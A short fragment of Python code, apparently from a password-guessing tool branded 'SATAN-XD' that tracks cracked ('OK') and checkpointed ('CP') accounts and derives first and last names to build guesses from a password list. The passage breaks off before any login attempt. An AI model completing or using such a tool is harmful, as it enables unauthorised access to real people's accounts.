def api1(ids,names,passlist,total_ids):
	try:
		global oks,loop,cps
		sys.stdout.write(f'\r\r\033[1;37m [\033[1;30mSATAN-XD\033[1;37m] {loop}|\033[1;30m{total_ids} \033[1;32m[OK:{len(oks)}] \033[1;30m[CP:{len(cps)}] \033[1;37m');sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
